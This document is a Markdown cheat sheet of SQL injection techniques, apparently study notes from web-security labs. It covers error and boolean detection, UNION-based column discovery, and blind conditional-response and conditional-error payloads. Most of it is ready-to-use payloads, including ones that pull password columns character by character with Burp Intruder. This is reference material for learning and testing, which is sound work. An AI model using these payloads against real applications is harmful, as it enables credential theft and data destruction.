
## Detecting SQLi

- The single quote character `'` and look for errors or other anomalies.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.


## Retrieve Data, Subvert Application Logic

- Below are some examples of payloads. Whether they will work or not depends and not **GURANTEED**. We need to have an idea of the query made to the application's database based on which we need to make modifications of the below payloads.
### **PAYLOADS** :

```sql
--
-- '
' --
OR 1=1 --'
'+OR+1=1--  
'
/*
Warning: Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

use + sign to produce spaces in HTTP/HTTPS requests.
*/
```


## Retrieve Data from Database Tables

- To retrieve data from other tables in the database we can use the `UNION` keyword to execute additional `SELECT` query and append those results to the original query to get more information.
### **Requirements** :

- Same number of columns need to be selected in `SELECT` statements to use `UNION`.
- The columns must have same datatype.
- The columns must have the same order. For example : `table1 -> col1=int col2=string then table2 col1=string col2=int will give error. order same, datatype same, position matters  so => table2 -> col2=string col1=int will be right`.


### 1. Determine number of columns required

- **METHOD 1** :
	- Use the `ORDER BY` clause and increase the number by `1` each time until we hit an error to understand the number of columns returned by the original query. The number where we hit the error subtract `-1` to get number of columns. For example : `error at 3 so total columns = 3 - 1 = 2`.
		
	- The number of columns you find here will determine the payload structure of the rest of the steps.

```sql
' ORDER BY 1-- -> for oracle
' ORDER BY 1# -> for mysql

etc...
```


- **METHOD 2** :
	- Involves submitting a series of `UNION SELECT` payloads specifying a different number of null values. If returns no error then number of columns = number of NULLs. If returns error increase number of `NULL`s For example : `' UNION SELECT NULL, NULL--`
		
	- The number of columns you find here will determine the payload structure of the rest of the steps.

```sql
' UNION SELECT NULL-- -> for postgresql, microsoft
' UNION SELECT NULL# -> for mysql
' UNION SELECT NULL FROM DUAL-- -> for oracle

etc...'
/*
on oracle every select query requires FROM keyword with a valid table name
DUAL is an oracle inbuilt table present in the database

use + sign to produce spaces in HTTP/HTTPS requests.
*/
```

### 2.  Finding String Compatible Datatype/Column Datatype Order

- Finding string compatible datatype lets us understand which column/columns is displaying string type data and the order of column in which the string datatype is displayed. Now the idea is if there is a **username** , **password** column we can insert it into this position and the data will be possibly displayed onscreen.
	
- If we get an error then we need to move `'a'` to the subsequent positions of `NULL` and recheck until we get no error. If we get no error and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data. That being said sometimes no error but output still might not be displayed.
	
- This way we can not only find whether there is a string compatible datatype in the original query but also find the order of datatypes in the columns. 
	
- Remember that there can be **more than 1 string type compatible columns** so you can try using `'b'`, `'c'`, `'d'`... to check further columns compatibility with string datatype.

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- -> for postgresql, microsoft
' UNION SELECT 'a',NULL,NULL,NULL# -> for mysql
' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL--  -> for oracle


etc...'
/*
' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL 
on oracle every select query requires FROM keyword with a valid table name
DUAL is an oracle inbuilt table present in the database

Remember that there can be more than 1 string type compatible columns so you can try using 'b', 'c', 'd'... to check further columns compatibility with string datatype. example : - ' UNION SELECT 'a','b',NULL,NULL--

use + sign to produce spaces in HTTP/HTTPS requests.
*/
```

### Payload Injection
#### **Retrieve Multiple values from Multiple Columns**

- If original query allows more than 1 column to display data the below payloads can be used.

```sql
' UNION SELECT <columns> FROM <table name>-- -> for oracle, microsost, postgresql
' UNION SELECT <columns> FROM <table name># -> for mysql
/*
the number of columns will vary based on what we find in the requirements phase
the order, number of columns everything depends on the requirement phase
so do it carefully to get better results over here.

use + sign to produce spaces in HTTP/HTTPS requests.
*/
```

#### **Retrieve Multiple values from Single Column**

- If original query only allows 1 column to display data but we need values from more than 1 column we can use the below payload.
	
- the above payload can be used to retrieve multiple values from a single column. This technique can be useful when we need more than values from multiple columns but only 1 column value can be displayed.

```sql
' UNION SELECT <columns>||'~'||<columns> FROM <table_name>-- -> for oracle, postgresql
' UNION SELECT <columns>+'~'+<columns> FROM <table_name>-- -> for microsoft
' UNION SELECT CONCAT(<columns>, '~', <columns>) FROM <table_name># for mysql
/*
use + sign to produce spaces in HTTP/HTTPS requests.
*/
```

---
## Blind SQLi Techniques

## Conditional Responses

- The below techniques are based on Blind SQLi conditional responses i.e. we need to infer our SQLi payload and customize it based on what the response we get. Like creating **true** or **false** statements. **true** and **false** responses will vary. Like for example :- The server might say **welcome** if the query output is **true** and might not output anything if query output is **false**.

### 1. Checking Parameter Vulnerability

- Lets say the original query is `SELECT item_name FROM Shop WHERE item_name=something`
- Have a basic idea or concept of what the query might be doing and then do the below stuff.
- Check parameter vulnerabilities like cookies or something if any.
- Look for server responses, any change, analyze code or something.

```sql
' AND '1'='1
' AND '1'='2
/*
the above 2 payloads are demo
like check each one and if responses differ you got a SQLi vulnerability
*/
```

### 2. Checking Table Presence

- For example a query has a structure like `SELECT item_name FROM Shop WHERE item_name='something'` . Now in this query lets say we want to add our own query to check if a certain table is present or not.
- Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.

```sql
' AND (SELECT 'a' FROM <table_name> LIMIT 1)='a'--
```

### 3. Checking User Entry

- For example a query has a structure like `SELECT item_name FROM Shop WHERE item_name='something'` . Now in this query lets say we want to add our own query to check if a certain table is present or not.
- Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.

```sql
' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' LIMIT 1)='a'--
```

### 4. Finding Password Length

- Increment the `1` value by one each time until you hit an error. So if at `19` you get error so the password length is 19.

```sql
'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>) > 1)='a'--
```

### 5. Bruteforcing Password

- This attack uses **Blind SQL Injection with BurpSuite Intruder** to extract sensitive data (e.g., password) one character at a time by checking conditions. The base payload structure is `SELECT item_name FROM Shop WHERE item_name='input'`
- The payload is designed to extract a **single character from the password column** using the `SUBSTRING()` function. It compares that character with a guessed value provided via BurpSuite payloads.
- Use BurpSuite Cluster Bomb Attack.
	- **Payload 1 Configuration**
		- `POS` should contain numbers from 1 to **length of the password**.
		- Like load Payload type Numbers and fill the input field. Starting = 1, Ending = **length of password**, Step = 1.
		
	- **Payload 2 Configuration**
		- `CHAR` should have characters which you want to check against. The wordlist.
		- One character each line.

```sql
' AND (SELECT SUBSTRING(<password_column>,§POS§,1) FROM users WHERE <username_column>='<username>')='§CHAR§'--
```

## Conditional Errors

- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message 
- We can use our custom payload to generate specific errors and use those errors to gain further info about the database and ask **true** and **false** questions instead of directly asking it.

### 1. Checking Parameter Vulnerability

```sql
'
''
/*
verify which one of the above payloads cause error and which payload makes it disappear. If there is error produced in one and the other produces none then we have a vulnerable parameter. Since its a conditional error based sqli so direct true false queries will not work since the wep app will not return any rows. 
*/
```

### 2. Testing Error Entries

```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
/*
the above payload will always result in error cuz 1=1 and 1 divide by 0 result is undefined.
*/

' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'-- 
/*
the above payload will not result in error cuz 1=2 is false and else part will get executed.
*/

/*
NOTE: this is for oracle databases so check the Cheatsheet of SQli to give database specific string concatenation and syntaxes.
*/
```

### 3. Checking User Entry

```sql
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--

/*
NOTE: For database specific string concatenation and syntaxes checkout the Cheatsheet of the SQli.
*/
```

---
## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

